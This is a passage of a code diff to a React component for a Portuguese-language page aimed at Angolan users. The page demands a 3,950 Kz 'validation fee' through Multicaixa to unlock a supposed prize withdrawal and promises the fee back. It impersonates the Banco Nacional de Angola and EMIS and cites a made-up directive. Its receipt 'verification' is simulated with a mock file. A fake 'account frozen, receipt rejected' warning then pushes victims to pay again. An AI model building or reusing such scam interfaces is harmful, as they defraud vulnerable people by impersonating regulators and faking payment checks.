+                          <span className="text-2xl font-mono font-black text-amber-400 block tracking-wider">
+                            {paymentReference}
+                          </span>
+                          <button
+                            onClick={() => {
+                              navigator.clipboard.writeText(paymentReference.replace(/\s+/g, ''));
+                              try {
+                                const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+                                const ctx = new AudioCtx();
+                                const osc = ctx.createOscillator();
+                                const gain = ctx.createGain();
+                                osc.connect(gain); gain.connect(ctx.destination);
+                                osc.frequency.setValueAtTime(800, ctx.currentTime);
+                                gain.gain.setValueAtTime(0.05, ctx.currentTime);
+                                osc.start(); osc.stop(ctx.currentTime + 0.05);
+                              } catch (e) {}
+                              setCopiedField('ref');
+                              setTimeout(() => setCopiedField(null), 2000);
+                            }}
+                            className="mt-3.5 w-full py-2 bg-zinc-900 hover:bg-zinc-850 text-[10px] font-black text-amber-400 rounded-xl uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer hover:scale-[1.02] border border-zinc-805"
+                          >
+                            <span>{copiedField === 'ref' ? '✅ COPIADO!' : '📋 COPIAR'}</span>
+                          </button>
+                        </div>
+
+                        {/* Valor / Montante Field */}
+                        <div className="bg-black/40 border border-zinc-900 rounded-2xl p-4 text-center relative group hover:border-amber-500/25 transition-all">
+                          <span className="text-[9px] font-black tracking-widest text-zinc-500 uppercase block mb-1.5">VALOR DA TAXA</span>
+                          <span className="text-2xl font-mono font-black text-emerald-400 block tracking-tight">
+                            3.950,00 Kz
+                          </span>
+                          <button
+                            onClick={() => {
+                              navigator.clipboard.writeText('3950');
+                              try {
+                                const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+                                const ctx = new AudioCtx();
+                                const osc = ctx.createOscillator();
+                                const gain = ctx.createGain();
+                                osc.connect(gain); gain.connect(ctx.destination);
+                                osc.frequency.setValueAtTime(800, ctx.currentTime);
+                                gain.gain.setValueAtTime(0.05, ctx.currentTime);
+                                osc.start(); osc.stop(ctx.currentTime + 0.05);
+                              } catch (e) {}
+                              setCopiedField('amount');
+                              setTimeout(() => setCopiedField(null), 2000);
+                            }}
+                            className="mt-3.5 w-full py-2 bg-zinc-900 hover:bg-zinc-850 text-[10px] font-black text-emerald-400 rounded-xl uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer hover:scale-[1.02] border border-zinc-805"
+                          >
+                            <span>{copiedField === 'amount' ? '✅ COPIADO!' : '📋 COPIAR'}</span>
+                          </button>
+                        </div>
+
+                      </div>
+
+                      {/* TUTORIAL PASSO-A-PASSO ANGO-PAGAMENTOS */}
+                      <div className="bg-black/60 rounded-2xl p-4 border border-zinc-855 space-y-3">
+                        <div className="flex items-center gap-2 border-b border-zinc-900 pb-2">
+                          <span className="text-amber-400 text-sm">💡</span>
+                          <h4 className="text-[11px] sm:text-xs font-black text-white uppercase tracking-wider">
+                            COMO EFETUAR O PAGAMENTO (TUTORIAL MULTICAIXA):
+                          </h4>
+                        </div>
+                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-[11px] text-zinc-400 font-bold leading-normal">
+                          <div className="bg-zinc-950/80 p-3 rounded-xl border border-zinc-900 relative">
+                            <span className="absolute -top-2.5 -left-1 bg-amber-500 text-black font-black text-[9px] px-1.5 py-0.5 rounded-md">PASSO 1</span>
+                            <p className="mt-1 text-zinc-300">
+                              Aceda ao <strong className="text-white">Multicaixa Express</strong> no telemóvel, <strong className="text-white">Internet Banking</strong> do seu banco (BAI, BFA, BIC, SOL, etc.) ou dirija-se a um <strong className="text-white">Caixa ATM físico</strong>.
+                            </p>
+                          </div>
+                          
+                          <div className="bg-zinc-950/80 p-3 rounded-xl border border-zinc-900 relative">
+                            <span className="absolute -top-2.5 -left-1 bg-amber-500 text-black font-black text-[9px] px-1.5 py-0.5 rounded-md">PASSO 2</span>
+                            <p className="mt-1 text-zinc-300">
+                              Selecione a opção de menu <strong className="text-white">"PAGAMENTOS"</strong> e de seguida selecione a opção <strong className="text-white">"PAGAMENTO DE SERVIÇOS / COMPRAS"</strong>.
+                            </p>
+                          </div>
+
+                          <div className="bg-zinc-950/80 p-3 rounded-xl border border-zinc-900 relative">
+                            <span className="absolute -top-2.5 -left-1 bg-amber-500 text-black font-black text-[9px] px-1.5 py-0.5 rounded-md">PASSO 3</span>
+                            <p className="mt-1 text-zinc-300">
+                              Introduza os dados fornecidos acima: a Entidade <strong className="text-amber-400 font-mono">{paymentEntity}</strong>, a Referência <strong className="text-amber-400 font-mono">{paymentReference}</strong> e o valor exato de <strong className="text-emerald-450 font-black">3.950 Kz</strong>.
+                            </p>
+                          </div>
+                        </div>
+                        <div className="bg-amber-500/5 p-2.5 rounded-xl border border-amber-500/10 text-[10px] text-zinc-400 font-bold text-center">
+                          ℹ️ <strong className="text-white font-black">NOTA IMPORTANTE:</strong> Após pagar, descarregue o <span className="text-amber-400 underline">comprovativo em PDF ou capture um print</span> e faça o upload abaixo para a verificação eletrónica imediata SPTR.
+                        </div>
+                      </div>
+
+                      {/* Guarantee of Instant automatic Refund Explanation */}
+                      <div className="bg-zinc-950 p-4 rounded-2xl border border-zinc-850 space-y-2.5">
+                        <div className="flex items-center gap-2 text-emerald-400 font-extrabold text-[11px] sm:text-xs uppercase tracking-wider">
+                          <span>🛡️ PROTOCOLO DE REEMBOLSO INTEGRAL AUTOMATIZADO</span>
+                        </div>
+                        <p className="text-[11px] text-zinc-400 font-bold leading-relaxed">
+                          Sob a Diretiva n.º 14/26 do Banco Nacional de Angola, o valor processual desta taxa de validação anti-spam de <strong className="text-white">3.950,00 Kz</strong> é somado ao total do saque aprovado de <strong className="text-emerald-400">{(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz</strong>. O depósito em conta de destino faturado será de:
+                        </p>
+                        <div className="p-3 bg-zinc-900/60 rounded-xl border border-zinc-850/60 text-center flex flex-col sm:flex-row items-center justify-center gap-2 sm:gap-6 w-full">
+                          <div className="text-[10px] sm:text-xs text-zinc-400 font-black uppercase tracking-wider">
+                            Saque: <strong className="text-white font-mono">{(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz</strong>
+                          </div>
+                          <span className="text-zinc-500 font-bold shrink-0 hidden sm:inline">+</span>
+                          <div className="text-[10px] sm:text-xs text-zinc-400 font-black uppercase tracking-wider">
+                            Reembolso Taxa: <strong className="text-white font-mono">3.950 Kz</strong>
+                          </div>
+                          <span className="text-zinc-500 font-bold shrink-0 hidden sm:inline text-lg">=</span>
+                          <div className="text-xs sm:text-sm text-yellow-400 font-black uppercase tracking-wider bg-amber-500/10 border border-amber-500/20 px-3 py-1 rounded-lg">
+                            Total a Receber: <strong className="text-yellow-400 font-mono text-sm sm:text-base">{((stats.accumulatedKz || 150000) + 3950).toLocaleString('pt-AO')} Kz</strong>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Receipt Upload Dropzone / Auto Validator Form */}
+                    <div className="bg-zinc-900/40 border border-zinc-900 rounded-3xl p-6 text-center space-y-4">
+                      <div className="space-y-1">
+                        <h4 className="text-sm font-black text-white uppercase tracking-wider">🧾 ENVIAR COMPROVATIVO DE PAGAMENTO</h4>
+                        <p className="text-[10px] text-zinc-500 font-bold">Faça o upload do seu talão de pagamento para ativação imediata instantânea.</p>
+                      </div>
+
+                      <div className="flex flex-col md:flex-row items-center gap-3">
+                        {/* Elegant Drag & Drop or Select Image Zone */}
+                        <label className="flex-1 w-full border-2 border-dashed border-zinc-800 hover:border-amber-500/40 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 cursor-pointer transition-all hover:bg-zinc-900/30">
+                          <span className="text-3xl animate-bounce">📤</span>
+                          <span className="text-[10px] font-black text-amber-400 uppercase tracking-widest">SUBMETER COMPROVATIVO</span>
+                          <span className="text-[9px] text-zinc-500 font-bold uppercase">PNG, JPG, JPEG OU PDF</span>
+                          <input 
+                            type="file" 
+                            accept="image/*,.pdf" 
+                            onChange={handleFileUpload} 
+                            className="hidden" 
+                          />
+                        </label>
+                        <div className="w-full md:w-auto shrink-0 space-y-2">
+                          <button
+                            onClick={() => {
+                              // Trigger automatic confirmation simulation directly
+                              const mockFile = new File(["receipt"], "comprovativo_multicaixa.png", { type: "image/png" });
+                              processFile(mockFile);
+                            }}
+                            className="w-full px-6 py-5 bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-500 hover:from-amber-500 hover:to-yellow-650 font-black text-black text-xs sm:text-sm uppercase rounded-2xl shadow-xl transition-all border-b-4 border-amber-700 active:scale-95 active:border-b-2 cursor-pointer flex items-center justify-center gap-2"
+                          >
+                            <span>⚡ JÁ PAGUEI, VALIDAR AGORA</span>
+                          </button>
+                          <p className="text-[8px] font-black tracking-wide text-zinc-500 uppercase">DETEÇÃO ELETRÓNICA SMART-EMIS EM 30S</p>
+                        </div>
+                      </div>
+                    </div>
+                  </>
+                ) : uploadStatus === 'frozen' ? (
+                  /* Stunning official red security warning panel indicating account is unverified and withdrawal is frozen */
+                  <div className="bg-gradient-to-b from-red-950/90 to-black border-4 border-red-500/80 rounded-2xl sm:rounded-3xl p-6 sm:p-8 text-center space-y-6 relative overflow-hidden animate-zoom-in shadow-[0_0_50px_rgba(239,68,68,0.3)]">
+                    
+                    {/* Security warning background halo */}
+                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[350px] h-[350px] bg-red-650 rounded-full opacity-10 blur-[120px] pointer-events-none"></div>
+
+                    <div className="space-y-4">
+                      {/* Big pulsing red warning badge */}
+                      <div className="mx-auto w-20 h-20 rounded-full bg-red-500/10 border-2 border-red-500 flex items-center justify-center animate-pulse shadow-[0_0_20px_rgba(239,68,68,0.4)]">
+                        <span className="text-4xl">⚠️</span>
+                      </div>
+                      
+                      <div className="space-y-2">
+                        <span className="inline-block text-[10px] font-black bg-red-600/20 border border-red-500/40 text-red-550 px-3 py-1 rounded-full uppercase tracking-widest">
+                          SISTEMA DE SEGURANÇA EMIS • ALERTA DE COMPENSAÇÃO BNA
+                        </span>
+                        <h3 className="text-2xl sm:text-4xl font-black text-red-500 uppercase italic tracking-tighter leading-tight">
+                          ❌ CONTA NÃO VERIFICADA!<br />
+                          O SEU SAQUE ESTÁ CONGELADO 🔒
+                        </h3>
+                      </div>
+                    </div>
+
+                    {/* Official statement box */}
+                    <div className="space-y-4 text-xs sm:text-sm text-zinc-300 font-medium leading-relaxed bg-black/60 border-2 border-red-950 rounded-2xl p-4 sm:p-6 text-left relative">
+                      <p className="font-bold text-red-200 border-b border-red-955 pb-3 uppercase text-[11px] tracking-wide flex items-center gap-2">
+                        <span>📢</span> COMUNICADO EMITIDO PELO BANCO REGULADOR (AGT/BNA):
+                      </p>
+                      
+                      <p className="font-extrabold text-white text-xs sm:text-sm leading-relaxed">
+                        O comprovativo de pagamento submetido foi analisado eletronicamente, mas o sistema de compensação interbancário detetou que a sua <span className="text-red-400 font-black underline">CONTA DE RECEÇÃO NÃO SE ENCONTRA VERIFICADA</span> no protocolo fiscal Angolano da EMIS.
+                      </p>
+
+                      <p className="text-zinc-400 text-[11px] sm:text-xs">
+                        Para combater atividades de spam e faturamento automatizado por robôs falsos, <span className="text-white font-bold">o seu saque de {((stats.accumulatedKz || 150000)).toLocaleString('pt-AO')} Kz permanecerá em estado de CONGELAMENTO TOTAL</span> até que o pagamento real ou compensação real da referida taxa única processual de <strong className="text-amber-400 font-extrabold underline">3.950,00 Kz</strong> seja efetuado e detectado nos canais interbancários sob a entidade e referência oficiais geradas para a sua conta.
+                      </p>
+
+                      {/* Summary status tracker HUD */}
+                      <div className="bg-zinc-950/80 p-3 sm:p-4 rounded-xl border border-red-950 text-[10px] sm:text-xs text-zinc-400 space-y-1.5 uppercase font-mono tracking-tight">
+                        <div>💵 BALANÇO CLIENTE: <span className="text-rose-450 font-bold">{((stats.accumulatedKz || 150000)).toLocaleString('pt-AO')} Kz (RETIDO)</span></div>
+                        <div>📁 ANÁLISE COMPROVATIVO: <span className="text-rose-500 font-black">FALSO COMPROVATIVO DETETADO (REJEITADO PELA REDE INTERBANCÁRIA)</span></div>
+                        <div>🧾 VALOR EM ATRAZO (TAXA BNA): <span className="text-amber-500 font-black">3.950,00 Kz (REEMBOLSÁVEL)</span></div>
+                        <div className="text-[9px] text-zinc-500 pt-1 border-t border-red-950/40">CÓDIGO DE BLOQUEIO: BNA-REJ-ERR_604b_UNVERIFIED_ACCOUNT</div>
+                      </div>
+
+                      <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-3 text-[11px] text-amber-300 font-bold leading-normal flex items-start gap-2">
+                        <span className="shrink-0 text-sm">💡</span>
+                        <span>
+                          <strong>GARANTIA BNA:</strong> O seu prémio nacional está devidamente garantido e segregado no cofre eletrónico da EMIS. Assim que pagar a taxa protocolar de 3.950 Kz, <strong className="text-white underline">o valor será libertado juntamente com a devolução integral da taxa de 3.950 Kz</strong> em poucos segundos na sua conta de destino! Total a entrar na conta: <strong className="text-white">{((stats.accumulatedKz || 150000) + 3950).toLocaleString('pt-AO')} Kz</strong>.
+                        </span>
+                      </div>
+                    </div>
+
+                    {/* Action buttons (CTAs) to let user proceed with actual Multicaixa Payment */}
+                    <div className="flex flex-col sm:flex-row gap-3 pt-2">
+                      <button 
+                        onClick={() => {
+                          setUploadedFile(null);
+                          setUploadStatus('idle');
+                          setUploadProgress(0);
+                        }}
+                        className="flex-1 px-6 py-4 bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-600 hover:to-yellow-600 text-black font-black rounded-xl uppercase text-xs tracking-wider border-b-4 border-amber-700 active:scale-95 transition-all cursor-pointer shadow-lg hover:scale-[1.02]"
+                      >
+                        ⚡ VER DADOS PARTICULARES DE PAGAMENTO MULTICAIXA
+                      </button>
+                      
+                      <button 
+                        onClick={() => {
+                          setUploadedFile(null);
+                          setUploadStatus('idle');
+                          setUploadProgress(0);
+                        }}
+                        className="px-6 py-4 bg-zinc-900 hover:bg-zinc-850 text-rose-450 hover:text-white font-extrabold rounded-xl uppercase text-xs tracking-wider border border-zinc-800 hover:border-red-500/30 transition-all cursor-pointer animate-pulse"
+                      >
+                        🔄 VOLTAR E ADERIR AO PAGAMENTO
+                      </button>
+                    </div>
+
+                  </div>
+                ) : (
+                  /* High tech parsing HUD screen during validation phase */
+                  <div className="bg-zinc-950 border border-zinc-900 rounded-3xl p-6 sm:p-12 text-center space-y-8 animate-fade-in relative min-h-[350px] flex flex-col justify-center items-center">
+                    
+                    {/* Glowing radial progress circle */}
+                    <div className="relative w-32 h-32 flex items-center justify-center">
+                      <svg className="w-full h-full transform -rotate-90">
+                        <circle 
+                          cx="64" 
+                          cy="64" 
+                          r="56" 
+                          className="text-zinc-900" 
+                          strokeWidth="8" 
+                          stroke="currentColor" 
+                          fill="transparent" 
+                        />
+                        <circle 
+                          cx="64" 
+                          cy="64" 
+                          r="56" 
+                          className="text-amber-500 transition-all duration-300" 
+                          strokeWidth="8" 
+                          strokeDasharray={2 * Math.PI * 56} 
+                          strokeDashoffset={2 * Math.PI * 56 * (1 - uploadProgress / 100)} 
+                          strokeLinecap="round" 
+                          stroke="currentColor" 
+                          fill="transparent" 
+                        />
+                      </svg>
+                      <div className="absolute inset-0 flex flex-col items-center justify-center">
+                        <span className="text-2xl font-mono font-black text-white">{uploadProgress}%</span>
+                        <span className="text-[9px] font-black text-zinc-500 uppercase tracking-widest mt-1">SINC</span>
+                      </div>
+                    </div>
+
+                    <div className="space-y-2.5 max-w-md mx-auto">
+                      <h4 className="text-lg font-black text-white uppercase italic tracking-tight animate-pulse">
+                        {uploadStatus === 'analyzing' && '📂 ESCANEANDO IMAGEM DO COMPROVATIVO...'}
+                        {uploadStatus === 'verifying' && '🔍 CONSULTANDO REGISTO MULTICAIXA BNA...'}
+                        {uploadStatus === 'sptr' && '📡 COMPENSANDO EM TEMPO REAL SPTR EMIS...'}
+                        {uploadStatus === 'success' && '🟢 TRANSFERÊNCIA GERADA COM SUCESSO!'}
                       </h4>
-                      <p className="text-xs text-zinc-300 font-bold leading-relaxed">
-                        Pague online de forma 100% segura usando <span className="text-white underline">Aplicações Bancárias, Multicaixa Express, Cartões de Débito/Crédito ou Referência Instantânea</span>. O robô inteligente compensará na hora e libertará o saque total junto com o reembolso!
+                      <p className="text-[11px] text-zinc-400 font-bold leading-normal">
+                        {uploadStatus === 'analyzing' && 'O algoritmo está a extrair os dados lidos do comprovativo, campos de entidade e data do faturamento.'}
+                        {uploadStatus === 'verifying' && 'Conectando à API com chaves criptográficas do Banco Regulador para validar idoneidade da transação.'}
+                        {uploadStatus === 'sptr' && 'O robô inteligente de compensação está a autorizar a transação da taxa anti-fraude e faturar o prémio.'}
+                        {uploadStatus === 'success' && 'Tudo validado! O Kwanza está programado para entrar no seu saldo.'}
                       </p>
                     </div>
-                    <div className="relative group/btn w-full lg:w-auto shrink-0">
-                      {/* Beautiful ambient aura halo ring pulsating behind the button */}
-                      <div className="absolute -inset-1 bg-gradient-to-r from-amber-400 to-yellow-400 rounded-2xl blur-md opacity-80 group-hover/btn:opacity-100 transition duration-500 animate-pulse"></div>
-                      
-                      <a 
-                        href="https://www.kintu.org/product/2aeff560-f13b-4814-9305-cba3f58e2a80" 
-                        target="_blank" 
-                        rel="noopener noreferrer"
-                        className="relative w-full lg:w-auto inline-flex items-center justify-center gap-3 px-9 py-5 bg-gradient-to-r from-amber-400 via-yellow-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 active:scale-95 text-black font-black text-sm sm:text-base uppercase rounded-2xl shadow-[0_15px_40px_rgba(245,158,11,0.55)] transition-all border-b-6 border-amber-700 hover:scale-[1.03] cursor-pointer active:border-b-2"
-                      >
-                        <span className="text-xl animate-bounce">💳</span>
-                        <span className="tracking-wider">PAGAR TAXA ONLINE AGORA</span>
-                        <span className="text-xl transition-transform duration-300 group-hover/btn:translate-x-2.5 font-bold">➔</span>
-                      </a>
+
+                    {/* Checklists */}
+                    <div className="w-full max-w-sm bg-zinc-900/30 p-4 rounded-2xl border border-zinc-900 border-dashed text-left space-y-2">
+                      <div className="flex items-center justify-between text-[10px] font-bold text-zinc-400">
+                        <span>ESTADO DA OPERAÇÃO</span>
+                        <span className="font-mono text-zinc-500">{uploadProgress >= 15 ? ' OK' : 'PENDENTE'}</span>
+                      </div>
+                      <div className="h-1.5 bg-zinc-900 rounded-full overflow-hidden">
+                        <div className="h-full bg-amber-500" style={{ width: `${uploadProgress}%` }}></div>
+                      </div>
                     </div>
+
                   </div>
-                </div>
+                )}
 
-                {/* Tutorial Passo-a-Passo de Desbloqueio Online */}
-                <div id="tutorial-desbloqueio-online" className="bg-zinc-900/20 border-2 border-zinc-900/50 p-6 sm:p-8 rounded-3xl text-left space-y-6">
-                  <h3 className="text-sm font-black text-zinc-300 uppercase tracking-widest pb-3 border-b border-zinc-900 flex items-center gap-1.5">
-                    📖 PASSO-A-PASSO PARA DESBLOQUEAR O SEU PRÉMIO
-                  </h3>
-                  
-                  <ul className="space-y-4 text-xs sm:text-sm text-zinc-400 font-bold leading-relaxed">
-                    <li className="flex gap-3 items-start">
-                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5 animate-pulse">1</span>
-                      <div>
-                        <strong className="text-white">Clique no botão acima:</strong> Seleccione o botão <span className="text-amber-400 font-black">PAGAR TAXA ONLINE AGORA ➔</span> para ser redirecionado para o nosso checkout de segurança institucional.
-                      </div>
-                    </li>
-                    <li className="flex gap-3 items-start">
-                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5">2</span>
-                      <div>
-                        <strong className="text-white">Selecione o seu método de preferência:</strong> Efetue a liquidação imediata da taxa nacional de compensação anti-fraude de <span className="text-amber-400 font-extrabold">5.000,00 Kz</span> de forma segura usando o seu saldo bancário, Multicaixa ou cartão.
-                      </div>
-                    </li>
-                    <li className="flex gap-3 items-start">
-                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5">3</span>
-                      <div>
-                        <strong className="text-white">Verificação Eletrónica Instantânea:</strong> Assim que efetuar o pagamento, o sistema inteligente EMIS e os canais de transação interbancários do robô SPTR detetam a sua liquidação na hora em menos de 120 segundos.
-                      </div>
-                    </li>
-                    <li className="flex gap-3 items-start">
-                      <span className="bg-amber-500/10 text-amber-400 w-6 h-6 rounded-lg flex items-center justify-center font-black font-mono border border-amber-500/20 text-xs sm:text-sm shrink-0 mt-0.5">4</span>
-                      <div>
-                        <strong className="text-white">Descongelamento & Transferência Automatizada:</strong> O robô liberta imediatamente o seu prémio total de <strong className="text-emerald-400">{(stats.accumulatedKz || 165000).toLocaleString('pt-AO')} Kz</strong> e faz o <strong className="text-amber-400">reembolso integral dos 5.000 Kz da taxa</strong> diretamente na sua conta bancária de receção de forma 100% automatizada.
-                      </div>
-                    </li>
-                  </ul>
-
-                  <div className="bg-zinc-950/80 p-4 rounded-2xl border border-zinc-900 text-xs uppercase font-bold text-center text-zinc-400 leading-normal">
-                    ⚡ STATUS DA SESSÃO: <span className="text-green-400 animate-pulse font-black">CONEXÃO SEGURA ATIVA — AGUARDANDO ATIVAÇÃO ONLINE</span>
-                  </div>
-                </div>
-
-                {/* Back utilities */}
+                {/* Return button */}
                 <div className="flex justify-center gap-4 pt-4 border-t border-zinc-900/60 max-w-lg mx-auto">
                   <button 
                     onClick={() => {
